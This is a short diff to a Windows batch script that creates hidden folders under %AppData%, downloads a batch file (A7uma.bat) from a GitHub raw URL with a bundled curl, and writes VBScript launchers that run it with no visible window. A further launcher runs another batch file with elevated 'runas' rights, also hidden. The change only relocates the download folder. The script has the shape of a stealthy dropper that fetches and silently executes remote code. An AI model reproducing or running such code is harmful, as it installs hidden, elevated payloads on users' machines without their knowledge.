@@ -3,12 +3,12 @@ mkdir %AppData%\Akuma
 attrib +h %AppData%\Akuma
 attrib +h %AppData%\curl
 attrib +h %AppData%\A7uma
-mkdir %homedrive%\ShiniGami
-attrib +h %homedrive%\ShiniGami
-%AppData%\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat > %homedrive%\ShiniGami\A7uma.bat
+mkdir %AppData%\ShiniGami
+attrib +h %AppData%\ShiniGami
+%AppData%\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat > %AppData%\ShiniGami\A7uma.bat
 del %AppData%\Akuma\死神.vbs
 echo Set objShell = CreateObject("WScript.Shell") >> %AppData%\Akuma\死神.vbs
-echo objShell.Run "%homedrive%\ShiniGami\A7uma.bat", 0, False >> %AppData%\Akuma\死神.vbs
+echo objShell.Run "%AppData%\ShiniGami\A7uma.bat", 0, False >> %AppData%\Akuma\死神.vbs
 del %AppData%\Akuma\beyondbirthday.vbs
 echo Set objShell = CreateObject("Shell.Application") >> %AppData%\Akuma\beyondbirthday.vbs
 echo objShell.ShellExecute "%AppData%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %AppData%\Akuma\beyondbirthday.vbs
